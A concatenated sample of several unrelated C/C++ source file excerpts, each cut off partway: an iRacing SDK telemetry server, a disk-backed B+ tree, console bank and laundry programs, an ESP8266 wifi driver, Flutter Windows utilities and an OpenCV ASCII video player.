INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\r\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\r\nLOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\r\nON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\r\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\r\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n*/\r\n\r\n// don't warn about stdlib\r\n#pragma warning(disable: 4996) \r\n\r\n#include <windows.h>\r\n#include <assert.h>\r\n\r\n// memory write barier, keeps compiler from messing up the ordering of our memoyr writes\r\n#include <intrin.h>\r\n#include <stdio.h>\r\n#pragma intrinsic(_WriteBarrier)\r\n\r\n#include \"irsdk_defines.h\"\r\n#include \"irsdk_server.h\"\r\n#include \"irsdk_memserver.h\"\r\n#include \"irsdk_diskserver.h\"\r\n\r\n// uncomment this to dump the vars to debug\r\n//#define DUMP_IRSDK_VAR_LIST\r\n\r\n// static accessors\r\nirsdkServer* irsdkServer::instance()\r\n{\r\n\t// initialize on the stack instead of the heap.  \r\n\t// That way we get initialized at first call \r\n\t// even if we are called in a static constructor.\r\n\tstatic irsdkServer instance;\r\n\treturn &instance;\r\n}\r\n\r\nirsdkServer::irsdkServer() \r\n\t: varCount(0)\r\n{\r\n\t//memset(varLookup, 0, sizeof(varLookup));\r\n}\r\n\r\nirsdkServer::~irsdkServer()\r\n{\r\n}\r\n\r\n// safe to call before m_isInitialized, only writes to localHeader\r\nint irsdkServer::regVar(const char *name, const void *var, \r\n\t\t\t\t\t\t\t  irsdk_VarType type, int count, \r\n\t\t\t\t\t\t\t  const char *desc, const char *unit,\r\n\t\t\t\t\t\t\t  int logMode, float multiplier, float offset)\r\n{\r\n\tint index = nameToIndex(name);\r\n\r\n\t// if not registered already\r\n\tif(index < 0)\r\n\t{\r\n\t\t// if someone can register\r\n\t\tif(logMode & IRSDK_LOG_ALL)\r\n\t\t{\r\n\t\t\t// choke if out of room\r\n\t\t\tassert(varCount < IRSDK_MAX_VARS);\r\n\t\t\t// create a new entry\r\n\t\t\tif(varCount < IRSDK_MAX_VARS)\r\n\t\t\t{\r\n\t\t\t\tindex = varCount++;\r\n\t\t\t\tstrncpy(varLookup[index].name, name, IRSDK_MAX_STRING);\r\n\t\t\t\tvarLookup[index].name[IRSDK_MAX_STRING-1] = '\\0';\r\n\t\t\t\tvarLookup[index].memIndex = varLookup[index].diskIndex = -1;\r\n\t\t\t\tvarLookup[index].logMode = logMode;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\t// ok, we have an index so notify the children\r\n\tif(index >= 0 && index < varCount)\r\n\t{\r\n\t\tif(logMode & IRSDK_LOG_LIVE)\r\n\t\t\tvarLookup[index].memIndex = irsdkMemServer::instance()->regVar(name, var, type, count, desc, unit, multiplier, offset);\r\n\r\n\t\tif(logMode & IRSDK_LOG_DISK)\r\n\t\t\tvarLookup[index].diskIndex = irsdkDiskServer::instance()->regVar(name, var, type, count, desc, unit, multiplier, offset);\r\n\t}\r\n\r\n\treturn index;\r\n}\r\n\r\n// warning, linear search!  don't call this often\r\nint irsdkServer::reRegVar(const char *name, const void *var)\r\n{\r\n\tint index = nameToIndex(name);\r\n\treturn (reRegVar(index, var)) ? index : -1;\r\n}\r\n\r\nbool irsdkServer::reRegVar(int index, const void *var)\r\n{\r\n\tif(index >= 0 && index < varCount)\r\n\t{\r\n\t\tif(varLookup[index].memIndex >= 0)\r\n\t\t\tirsdkMemServer::instance()->reRegVar(varLookup[index].memIndex, var);\r\n\t\tif(varLookup[index].diskIndex >= 0)\r\n\t\t\tirsdkDiskServer::instance()->reRegVar(varLookup[index].diskIndex, var);\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\n\r\n// warning, linear search!  don't call this often\r\nint irsdkServer::setVar(const char *name, const void *var)\r\n{\r\n\tint index = nameToIndex(name);\r\n\treturn (setVar(index, var)) ? index : -1;\r\n}\r\n\r\nbool irsdkServer::setVar(int index, const void *var)\r\n{\r\n\tif(index >= 0 && index < varCount)\r\n\t{\r\n\t\tif(varLookup[index].memIndex >= 0)\r\n\t\t\tirsdkMemServer::instance()->setVar(varLookup[index].memIndex, var);\r\n\t\tif(varLookup[index].diskIndex >= 0)\r\n\t\t\tirsdkDiskServer::instance()->setVar(varLookup[index].diskIndex, var);\r\n\r\n\t\treturn true;\r\n\t}\r\n\r\n\treturn false;\r\n}\r\n\r\n// safe to call before m_isInitialized, only writes to localHeader\r\nbool irsdkServer::regSessionInfo(const char *str)\r\n{\r\n\tbool ret = true",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include \"BPlusTree.h\"\r\n\r\ntemplate<typename keytype, typename valuetype>\r\nBPlusTree<keytype, valuetype>::BPlusTree(std::string name1, std::string name2){\r\n    Nfile_name = name1;\r\n    Ifile_name = name2;\r\n    //\u6253\u5f00\u5b58\u653eNode\u7684file\r\n    Nfile.open(name1,std::ios::in | std:: ios::out);\r\n    if (!Nfile.good()){\r\n        Nfile.open(name1, std::ios::out);\r\n        Nfile.close();\r\n        Nfile.open(name1,std::ios::in | std:: ios::out);\r\n    }\r\n    //\u6253\u5f00\u5b58\u653einformation\u7684file\r\n    Ifile.open(name2,std::ios::in | std:: ios::out);\r\n    if (!Ifile.good()){\r\n        Ifile.open(name2, std::ios::out);\r\n        Ifile.close();\r\n        Ifile.open(name2);\r\n    }\r\n    Ifile.seekg(0, std::ios::end);\r\n    int Ifile_size = Ifile.tellg();\r\n    if (Ifile_size == 0){\r\n        root = -1;\r\n        num = 0;\r\n        file_tail = 0;\r\n    }\r\n    else{\r\n        Ifile.seekg(0);\r\n        Ifile.read(reinterpret_cast<char*>(&root),sizeof(int));\r\n        Ifile.read(reinterpret_cast<char*>(&num), sizeof(int));\r\n        Ifile.read(reinterpret_cast<char*>(&file_tail), sizeof(int));\r\n    }\r\n}\r\n\r\ntemplate<typename keytype, typename valuetype>\r\nBPlusTree<keytype, valuetype>::~BPlusTree(){\r\n    if (Nfile.is_open()) Nfile.close();\r\n    if (Ifile.is_open()){\r\n        Ifile.close();\r\n        Ifile.open(Ifile_name, std::ios::out | std::ios::trunc);\r\n        Ifile.seekp(0);\r\n        Ifile.write(reinterpret_cast<char*>(&root), sizeof(int));\r\n        Ifile.write(reinterpret_cast<char*>(&num), sizeof(int));\r\n        Ifile.write(reinterpret_cast<char*>(&file_tail), sizeof(int));\r\n        Ifile.close();\r\n    }\r\n}\r\n\r\ntemplate<typename keytype, typename valuetype>\r\nint BPlusTree<keytype, valuetype>::create(){\r\n    int ori_tail = file_tail;\r\n    file_tail += sizeof(BPlusNode<keytype, valuetype>);\r\n    return ori_tail;\r\n}\r\n\r\ntemplate<typename keytype, typename valuetype>\r\nvoid BPlusTree<keytype, valuetype>::writeNode(BPlusNode<keytype, valuetype> &n, int pos_in){\r\n//    Nfile.close();\r\n//    Nfile.open(\"Nfile.txt\",std::ios::out | std::ios::in);\r\n\r\n    // int tmppp= 100;\r\n    // Nfile.seekp(pos_in);\r\n    // Nfile.write(reinterpret_cast<char*>(&tmppp), sizeof(tmppp));\r\n    // int tt;\r\n    // Nfile.seekg(pos_in);\r\n    // Nfile.read(reinterpret_cast<char*>(&tt), sizeof(tt));\r\n\r\n\r\n    //\u5907\u6ce8\uff1a\u5728\u6bcf\u6b21\u8282\u70b9\u7684\u8bfb\u5199\u65f6\u5f00\u6587\u4ef6\u5e76\u5173\u6587\u4ef6\u53ef\u4ee5\u6e05\u9664\u4e4b\u524d\u6587\u4ef6\u6307\u9488\u7684\u6240\u6709\u9519\u8bef\uff0c\u4f46\u4f1a\u5bfc\u81f4\u901f\u5ea6\u51cf\u6162\r\n    Nfile.seekp(pos_in);\r\n    n.pos = pos_in;\r\n    Nfile.write(reinterpret_cast<char*>(&n), sizeof(n));\r\n    // int tmp = sizeof (n);\r\n    // BPlusNode<keytype, valuetype> nnn;\r\n    // Nfile.seekg(pos_in);\r\n    // Nfile.read(reinterpret_cast<char*>(&nnn), sizeof(nnn));\r\n    // int tmpp = sizeof(nnn);\r\n}\r\n\r\ntemplate<typename keytype, typename valuetype>\r\nvoid BPlusTree<keytype, valuetype>::readNode(BPlusNode<keytype, valuetype> &n, int pos_in){\r\n    Nfile.seekg(pos_in);\r\n    Nfile.read(reinterpret_cast<char*>(&n), sizeof(n));\r\n}\r\n\r\ntemplate<typename keytype, typename valuetype>\r\nbool BPlusTree<keytype, valuetype>::Insert(Node<keytype, valuetype> &n){\r\n    if(root == -1){\r\n        BPlusNode<keytype, valuetype> tmp;\r\n        tmp.isleaf = true;\r\n        tmp.key[0] = n;\r\n        tmp.num = 1;\r\n        writeNode(tmp, 0);\r\n        root = 0;\r\n        file_tail = sizeof(tmp);\r\n        num = 1;\r\n        return true;\r\n    }\r\n    BPlusNode<keytype, valuetype> root_in;\r\n    readNode(root_in,root);\r\n    if(root_in.num == MAX_KEY){\r\n        BPlusNode<keytype, valuetype> newroot;\r\n        newroot.num = 0;\r\n        newroot.isleaf = false;\r\n        newroot.Ptr[0] = root;\r\n        spilit(newroot, root_in, 0);\r\n        writeNode(root_in, root);\r\n        root = create();\r\n        writeNode(newroot, root);\r\n    }\r\n    if(insert(root, n)){\r\n        num ++;\r\n        return true;\r\n    } \r\n    return false;\r\n}\r\n\r\n//\u63d2\u5165\u51fd\u6570\uff0c\u4fdd\u8bc1 cur\u7684\u4f4d\u7f6e\u7684\u53d8\u91cf\u4e3a BPlusNode \u7c7b\u578b\u7684\r\ntemplate<typename keytype, typename valuetype>\r\nbool BPlusTree<keytype, valuetype>::insert(int cur, Node<keytype, valuetype> &n){\r\n    BPlusNode<keytype, valuetype> x;\r\n    readNode(x, cur);\r\n    int i = 0;\r\n    for(; i < x.num && x.key[i] < n; i++);\r\n    if(i < x.num && x.isleaf && x.key[i] == n){\r\n        return false;\r\n    }\r\n    //\u5047\u5982\u73b0\u5728\u8282\u70b9\u4e0d\u662f\u5e95\u90e8\u8282\u70b9\r\n    if(!x.isleaf){\r\n        BPlusNode<keytype, valuetype> y;\r\n        readNode(y, x.Ptr[i]);\r\n        if(y.num == MAX_KEY){ //\u5047\u5982\u8282\u70b9\u5df2\u6ee1\uff0c\u5219\u88c2\u5757\r\n            spilit(x, y, i);\r\n            writeNode(x, cur);\r\n            writeNode(y, x.Ptr[i]);\r\n        }\r\n        if(n < x.key[i] || n == x.key[i] || i == x.num){\r\n            bool tmp = insert(x.Ptr[i], n);\r\n            if(!tmp) return false;\r\n        }\r\n        else{\r\n            bool tmp = insert(x.Ptr[i+1], n);\r\n            if(!tmp) return false;\r\n        }\r\n    }\r\n        //\u5047\u5982\u73b0\u5728\u8282\u70b9\u662f\u53f6\u8282\u70b9\r\n    else{\r\n        for(int j = x.num; j > i; --j){\r\n            x.key[j] = x.key[j-1];\r\n            x.Ptr[j] = x.Ptr[j-1];\r\n        }\r\n        x.key[i] = n;\r\n        // for(int w = 0; w < string_size; ++w){\r\n        //     x.key[i].first[w] = n.first[w];\r\n        // }\r\n        // x.key[i].second = n.secon",
    "#include <iostream>\n#include <fstream>\n\nusing namespace std;\n\nvoid showMenu() {\n    cout << \"**********MENU**********\" << endl;\n    cout << \"1. Check balance\" << endl;\n    cout << \"2. Deposit\" << endl;\n    cout << \"3. Withdraw\" << endl;\n    cout << \"4. Create new account\" << endl;\n    cout << \"5. Exit\" << endl;\n    cout << \"************************\" << endl;\n}\n\nvoid checkBalance(string account)\n{\n    fstream accountFile;\n    double balance;\n\n    account += \".txt\";\n    accountFile.open(account);\n\n    if (accountFile.fail())\n    {\n        cout << \"Account doesn't exist.\" << endl;\n        return;\n    }\n\n    accountFile >> balance;\n    cout << \"Balance is: \" << balance << \"$\" << endl;\n\n    accountFile.close();\n\n    balance = 0.0;\n    account = account.substr(0, account.size() - 4);\n}\n\nvoid makeDeposit(string account)\n{\n    fstream accountFile;\n    double balance;\n    double deposit;\n\n    account += \".txt\";\n    accountFile.open(account);\n\n    if (accountFile.fail())\n    {\n        cout << \"Account doesn't exist.\" << endl;\n        return;\n    }\n\n    accountFile >> balance;\n    cout << \"Deposit amount: \";\n    cin >> deposit;\n    balance += deposit;\n    accountFile.clear();\n    accountFile.seekp(0);\n    accountFile << balance;\n\n    accountFile.close();\n\n    balance = 0.0;\n    deposit = 0.0;\n    account = account.substr(0, account.size() - 4);\n\n}\n\nvoid makeWithdraw(string account) {\n    fstream accountFile;\n    double balance;\n    double withdraw;\n\n    account += \".txt\";\n\n    accountFile.open(account);\n\n    if (accountFile.fail())\n    {\n        cout << \"Account doesn't exist.\" << endl;\n        return;\n    }\n\n    cout << \"Withdraw amount: \";\n    cin >> withdraw;\n    accountFile >> balance;\n    if (withdraw <= balance) {\n        balance -= withdraw;\n        accountFile.clear();\n        accountFile.seekp(0);\n        accountFile << balance;\n    }\n    else {\n        cout << \"Not enough money.\" << endl;\n    }\n\n    accountFile.close();\n\n    balance = 0.0;\n    withdraw = 0.0;\n    account = account.substr(0, account.size() - 4);\n}\n\nvoid createAccount(string newAccount) {\n    fstream newAccFile;\n    int option;\n    double startBalance = 0;\n    newAccount += \".txt\";\n\n    newAccFile.open(newAccount, ios::out);\n    if (newAccFile.fail()) {\n        cout << \"Couldn't open new Account.\" << endl;\n        return;\n    }\n\n    newAccFile << startBalance;\n\n    cout << \"New Account successfully opened.\" << endl;\n\n    newAccFile.close();\n\n    newAccount = newAccount.substr(0, newAccount.size() - 4);\n\n    cout << \"Do you want to deposit money now?\" << endl;\n    cout << \"1. Yes\" << endl;\n    cout << \"2. No\" << endl;\n    cout << \"Option: \";\n    cin >> option;\n\n    if (option == 1) {\n        makeDeposit(newAccount);\n    }\n    else {\n        return;\n    }\n}\n\n\nint main()\n{\n    int option;\n    string account;\n    string newAccount;\n\n    do {\n        showMenu();\n        cout << \"Option: \";\n        cin >> option;\n\n        system(\"cls\");\n\n        if (option == 1) {\n            cout << \"Write Account name: \";\n            cin >> account;\n\n            checkBalance(account);\n        }\n        else if (option == 2) {\n            cout << \"Write Account name: \";\n            cin >> account;\n\n            makeDeposit(account);\n        }\n        else if (option == 3) {\n            cout << \"Write Account name: \";\n            cin >> account;\n\n            makeWithdraw(account);\n        }\n        else if (option == 4) {\n            string newAccount;\n            cout << \"Enter new account name: \";\n            cin >> newAccount;\n\n            createAccount(newAccount);\n        }\n        system(\"pause>0\");\n    } while (option != 5);\n    return 0;\n}",
    "/*=============================================================================\n * Copyright (c) 2021, Alejandro Rougier <alejandro.rougier@uner.edu.ar>\n * \t\t\t\t\n * All rights reserved.\n * License: Free\n * Date: 2021/11/12\n * Version: v1.0\n *===========================================================================*/\n\n/*==================[ Inclusions ]============================================*/\n\n#include \"wifi.h\"\n/*==================[ Local MAcros ]============================================*/\n#define STARTUPTIME     10000\n#define TIMETOCHECK     8000\n#define RESETTIME       500\n\nstatic uint16_t delayrespuesta=10;\n#define DELAYRESPONSE  delayrespuesta\n\n/*==================[ Local variables ]============================================*/\nuint8_t *buffRxw;                    //!< Puntero local al bufer circular de recepci\u00f3n\nuint8_t *indexRxWrite;              //!< Puntero local al indice de escritura del bufer circular de recepci\u00f3n\nstatic uint32_t maxBufferLength;    //!< Variable local tama\u00f1o del bufer circular de recepci\u00f3n\nstatic wifiData *dataConfigwifi;    //!< Puntero local a los datos de configuraci\u00f3n\nstatic bool configActive=false;     //!< Flag de configuraci\u00f3n activa\nstatic bool startUpActive=true;     //!< Flag de inicio de chequeo del ESP\nstatic uint8_t numTimeSend, numTimeRecive;\n/*==================[ Local Prototypes ]============================================*/\n/**\n * @brief Funci\u00f3n que se  llama cuando ocurre la IRQ_Rx\n * \n */\nstatic void onDataRx();\n\n/*==================[ Local typedef ]============================================*/\n\n/**\n * @brief Estructura para manejar la trasnmisi\u00f3n, recepci\u00f3n de datos del ESP\n * \n */\ntypedef struct{\n    uint8_t estado;           //!< Indica cual es el estado de la transmisi\u00f3n durante la configuraci\u00f3n \n    uint8_t indexWriteRx;    //!< Indice de escritura del buffer circular de recepci\u00f3n\n    uint8_t indexReadRx;     //!< Indice de lectura del buffer circular de recepci\u00f3n\n    uint8_t indexWriteTx;    //!< Indice de escritura del buffer circular de transmisi\u00f3n\n    uint8_t indexReadTx;     //!< Indice de lectura del buffer circular de transmisi\u00f3n\n    uint8_t bufferRx[256];   //!< Buffer circular de recepci\u00f3n\n    uint8_t bufferTx[256];   //!< Buffer circular de transmisi\u00f3n\n}_sDatoConfig ;\n\nstatic _sDatoConfig esp8266Data;\n\n/**\n * @brief Enumeraci\u00f3n para la MEF de configuraci\u00f3n del ESP\n * \n */\ntypedef enum{\n\t\t\tCWMODE_DEF,\n\t\t\tCWDHCP_DEF,\n\t\t\tCWJAP_DEF,\n            CIPMUX,\n\t\t\tCIFSR,\n\t\t\tCIPSTART,\n\t\t\tCIPMODE,\n\t\t\tCIPSEND,\n\t\t\tAWAITINGRESPONSE,\n\t\t\tINCOMMINGRESPONSE,\n            READYTOTRASMIT,\n\t\t\tAUTOMATIC,\n            ALIVE=0xF0\n} _eEstadoESP;\n\nstatic _eEstadoESP espState=CWMODE_DEF;\n\n/**\n * @brief Enumeraci\u00f3n de la MEF de las tareas comunes de la clase Wifi\n * \n */\ntypedef enum{\n        RESETWIFI,\n        STARTUP,\n        STANBY,\n        CONFIG,\n        READY\n}_eStateTask;\n\nstatic _eStateTask wifiTaskState;\n\n/*==================[ other Variables ]============================================*/\nTimer timerWifi;\n\nuint32_t timeWifi=0;\n\nuint32_t timestartUp=0;\n\nuint32_t timerReset=0;\n\nDigitalOut chipEnableESP(PA_3);\n\nRawSerial wifiCom(PB_10,PB_11,115200);\n\n/*==================[ Public Methods ]============================================*/\n\nWifi::Wifi(uint8_t *buff, uint8_t *indexWRx, uint32_t lengthBuff)\n{\n    buffRxw=buff;\n    indexRxWrite=indexWRx;\n    maxBufferLength=lengthBuff;\n    esp8266Data.indexReadRx=esp8266Data.indexReadTx=esp8266Data.indexWriteRx=esp8266Data.indexWriteTx=0;\n    wifiTaskState=RESETWIFI;\n    numTimeSend=numTimeRecive=0;\n}\n\nWifi::~Wifi()\n{\n\n}\n\n\nvoid Wifi::configWifi(wifiData *dataconfig){\n    configActive=true;\n    dataConfigwifi=dataconfig;\n    esp8266Data.estado=READYTOTRASMIT;\n    wifiReady=false;\n}\n\nvoid Wifi::writeWifiData(uint8_t *buff, uint8_t nBytes){\n    for(uint8_t i=0; i<nBytes; i++)\n        esp8266Data.bufferTx[esp8266Data.indexWriteTx++]=buff[i];\n}\n\n\nvoid Wifi::taskWifi(){\n    \n    switch (wifiTaskState)\n    {\n    case RESETWIFI:\n    if((timerWifi.read_us()-timerReset)>=RESETTIME){\n        timerReset=timerWifi.read_us();\n        if(chipEnableESP.read()){\n            chipEnableESP.write(false);   \n        }else{\n            chipEnableESP.write(true);\n            espState=CWMODE_DEF;\n            wifiTaskState=STARTUP;\n            numTimeSend=numTimeRecive=0;\n            timeWifi=timerWifi.read_ms();\n            timestartUp=timerWifi.read_ms();\n        }\n    }   \n    break;\n    case STARTUP:\n        if((timerWifi.read_ms()-timeWifi)>=STARTUPTIME){\n            startUpActive=false;\n            wifiTaskState=STANBY;\n        }\n        if((timerWifi.read_ms()-timestartUp)>=TIMETOCHECK){\n            if(wifiResponse(\"GOT IP\\0\", false)){\n                espState=CIPMUX; \n                startUpActive=false;\n                wifiTaskState=STANBY;\n            }\n        }\n       \n    break;\n    case STANBY:\n        if(configActive)\n            wifiTaskState=CONFIG;\n        break;\n    case CONFIG:\n        if(esp8266Data.indexReadTx!=esp8266Data",
    "#include <iostream>\r\n#include <cstring>\r\n#include <cstdlib>\r\n#include <queue>\r\n\r\nusing namespace std;\r\n\r\nstruct Pelanggan {\r\n    char nama[30];\r\n    char alamat[50];\r\n    char noHP[15];\r\n    char kategoricucian[30];\r\n    char jenis[50];\r\n};\r\n\r\nstruct Pesanan {\r\n    Pelanggan pelanggan;\r\n    double totalberat;\r\n    double hargaPerKg;\r\n    double subtotal;\r\n    double diskon;\r\n    double totalbayar;\r\n    double jumlahbayar;\r\n    double uangkembalian;\r\n};\r\n\r\nbool IsEmpty(const queue<Pesanan>& q) {\r\n    return q.empty();\r\n}\r\n\r\nvoid inputDataPelanggan(Pesanan& pesanan) {\r\n    cout << \"-----------------------------------------------------------------\" << endl;\r\n    cout << \"                      Input Data Pelanggan                       \" << endl;\r\n    cout << \"-----------------------------------------------------------------\" << endl;\r\n    cout << \"Nama Pelanggan : \";\r\n    cin.ignore();\r\n    cin.getline(pesanan.pelanggan.nama, sizeof(pesanan.pelanggan.nama));\r\n    cout << \"Alamat         : \";\r\n    cin.getline(pesanan.pelanggan.alamat, sizeof(pesanan.pelanggan.alamat));\r\n    cout << \"No Handphone   : \";\r\n    cin.getline(pesanan.pelanggan.noHP, sizeof(pesanan.pelanggan.noHP));\r\n    system(\"pause\");\r\n}\r\n\r\nvoid cetakStruk(const Pesanan& pesanan) {\r\n    cout << \"=================================================================\" << endl;\r\n    cout << \"                       LOVELY LAUNDRY                        \" << endl;\r\n    cout << \"=================================================================\" << endl;\r\n    cout << \"                      Struk Pembayaran                        \" << endl;\r\n    cout << \"-----------------------------------------------------------------\" << endl;\r\n    cout << \"Nama Pelanggan    : \" << pesanan.pelanggan.nama << endl;\r\n    cout << \"Alamat            : \" << pesanan.pelanggan.alamat << endl;\r\n    cout << \"No Handphone      : \" << pesanan.pelanggan.noHP << endl;\r\n    cout << \"-----------------------------------------------------------------\" << endl;\r\n    cout << \"Kategori Cucian   : \" << pesanan.pelanggan.kategoricucian << endl;\r\n    cout << \"Jenis Cucian      : \" << pesanan.pelanggan.jenis << endl;\r\n    cout << \"Berat Cucian      : \" << pesanan.totalberat << \" kg\" << endl;\r\n    cout << \"Harga per Kg      : Rp. \" << pesanan.hargaPerKg << endl;\r\n    cout << \"-----------------------------------------------------------------\" << endl;\r\n    cout << \"Subtotal          : Rp. \" << pesanan.subtotal << endl;\r\n    cout << \"Diskon            : Rp. \" << pesanan.diskon << endl;\r\n    cout << \"Total Bayar       : Rp. \" << pesanan.totalbayar << endl;\r\n    cout << \"Tunai             : Rp. \" << pesanan.jumlahbayar << endl;\r\n    cout << \"Kembalian         : Rp. \" << pesanan.uangkembalian << endl;\r\n\r\n    cout << \"\\nTerima kasih telah menggunakan jasa laundry kami!\" << endl;\r\n    system(\"pause\");\r\n}\r\n\r\nint main() {\r\n    queue<Pesanan> pesananQueue;\r\n    double hargaPerKg[] = {8000, 15000, 25000, 18000, 60000};\r\n\r\n    char pilihMenu;\r\n    do {\r\n        system(\"cls\");\r\n        cout << \"=================================================================\" << endl;\r\n        cout << \"                       LOVELY LAUNDRY                        \" << endl;\r\n        cout << \"=================================================================\" << endl;\r\n        cout << \"                            MENU                             \" << endl;\r\n        cout << \"-----------------------------------------------------------------\" << endl;\r\n        cout << \"                   1. Input Data Pelanggan                 \" << endl;\r\n        cout << \"                   2. Kategori Cucian                      \" << endl;\r\n        cout << \"                   3. Pembayaran                           \" << endl;\r\n        cout << \"                   4. Struk Pembayaran                     \" << endl;\r\n        cout << \"                   0. Keluar                               \" << endl;\r\n        cout << \"-----------------------------------------------------------------\" << endl;\r\n        cout << \"Pilih menu: \";\r\n        cin >> pilihMenu;\r\n        system (\"cls\");\r\n\r\n        switch (pilihMenu) {\r\n            case '1': {\r\n                Pesanan pesanan;\r\n                inputDataPelanggan(pesanan);\r\n                pesananQueue.push(pesanan);\r\n                break;\r\n            }\r\n            case '2': {\r\n                if (IsEmpty(pesananQueue)) {\r\n                    cout << \"Belum ada pesanan yang dimasukkan. Silakan masukkan data pelanggan terlebih dahulu.\" << endl;\r\n                    system(\"pause\");\r\n                } else {\r\n                    Pesanan& pesanan = pesananQueue.back();\r\n                    int kategori;\r\n                    do {\r\n                        system(\"cls\");\r\n                        cout << \"-----------------------------------------------------------------\" << endl;\r\n                        cout << \"                      Kategori Cucian                        \" << endl;\r\n                        cout << \"---",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <opencv2/opencv.hpp> \n#include <iostream>\n\n#include <thread>\n#include <chrono>\n\n#include <sys/ioctl.h>\n#include <unistd.h>\n#include <getopt.h>\n\nusing namespace std;\nusing namespace cv; \n\nstring convertToAscii(int intensity, const string &ASCII_CHARACTERS = \"*+=-:.     \", bool rev = false) {\n\tstring REV_ASCII_CHARACTERS;\n\tif(rev) {\n\t\tREV_ASCII_CHARACTERS = string(ASCII_CHARACTERS.rbegin(), ASCII_CHARACTERS.rend());\n\t}\n\n\treturn rev == false ? string(2, ASCII_CHARACTERS[intensity * ASCII_CHARACTERS.size() / 256]) : string(2, REV_ASCII_CHARACTERS[intensity * REV_ASCII_CHARACTERS.size() / 256]);\n}\n\nvoid getTerminalSize(int &WIDTH, int &HEIGHT) {\n\tstruct winsize w;\n\tioctl(STDOUT_FILENO, TIOCGWINSZ, &w);\n\tWIDTH = w.ws_col;\n\tHEIGHT = w.ws_row;\n}\n\nvoid printHelp() {\n    cout << \"Usage: ./bin/main [options] <Video_Path>\\n\"\n         << \"\\nOptions:\\n\"\n         << \"  -h              Display this help message\\n\"\n         << \"  -v              Show the actual video alongside ASCII output (default: false)\\n\"\n         << \"  -r              Reverse the ASCII character set (default: false)\\n\"\n         << \"  -c <charset>    Specify the ASCII character set to use (default: '*+=-:.     ')\\n\"\n         << \"\\nExample:\\n\"\n         << \"  ./bin/main -v -r -c '@%#*+=-:.     ' video.mp4\\n\";\n}\n\nint main(int argc, char** argv)  { \n\tint option;\n\tbool showVideo = false;\n\tbool reverse = false;\n\tstring asciiCharacters = \"*+=-:.     \";\n\n\twhile((option = getopt(argc, argv, \"hvrc:\")) != -1) {\n\t\tswitch(option) {\n\t\t\tcase 'h':\n\t\t\t\tprintHelp();\n\t\t\t\treturn 0;\n\t\t\tcase 'v':\n\t\t\t\tshowVideo = true;\n\t\t\t\tbreak;\n\t\t\tcase 'r':\n\t\t\t\treverse = true;\n\t\t\t\tbreak;\n\t\t\tcase 'c':\n\t\t\t\tasciiCharacters = optarg;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\tcout << \"Usage: ./bin/main [-v] [-r] [-c <Ascii Characters Set>] <Video_Path>\" << endl;\n\t\t\t\treturn -1;\n\t\t}\n\t}\n\n\tif (optind >= argc) {\n\t\tprintHelp();\n\t\treturn -1;\n\t}\n\n\tstring videoPath = argv[optind];\n\tVideoCapture cap(videoPath);\n\t\n\tif (!cap.isOpened()) { \n\t\tcout << \"Error opening video stream or file\" << endl; \n\t\treturn -1; \n\t}\n\n\tif(showVideo) {\n\t\tnamedWindow(\"Frame\", WINDOW_OPENGL);\n\t}\n\n\t// Find the fps of the video\n\tdouble fps = cap.get(CV_CAP_PROP_FPS);\n\tint frame_duration = 1000 / fps;\n\n\tint terminalWidth, terminalHeight;\n\tgetTerminalSize(terminalWidth, terminalHeight);\n\n\tint frameWidth = cap.get(CV_CAP_PROP_FRAME_WIDTH);\n\tint frameHeight = cap.get(CV_CAP_PROP_FRAME_HEIGHT);\n\n\tint WIDTH = showVideo ? terminalWidth / 4 : terminalWidth / 2;\t\n\tint HEIGHT = (WIDTH * frameHeight) / frameWidth * 0.5;\n\n\tMat frame, resized_frame; \n\n\twhile (1) { \n\t\tcap >> frame; \n\n\t\tif (frame.empty()) { \n\t\t\tbreak; \n\t\t}\n\n\t\t// Resize the frame\n\t\tresize(frame, resized_frame, Size(WIDTH, HEIGHT), 0, 0, INTER_CUBIC);\n\n\t\tif(showVideo) {\n\t\t\timshow(\"Frame\", frame); \n\t\t}\n\n\t\tstring ascii_frame = \"\";\n\t\t\n\t\tfor (int i = 0; i < HEIGHT; i++) {\n\t\t\tfor (int j = 0; j < WIDTH; j++) {\n\t\t\t\tascii_frame += 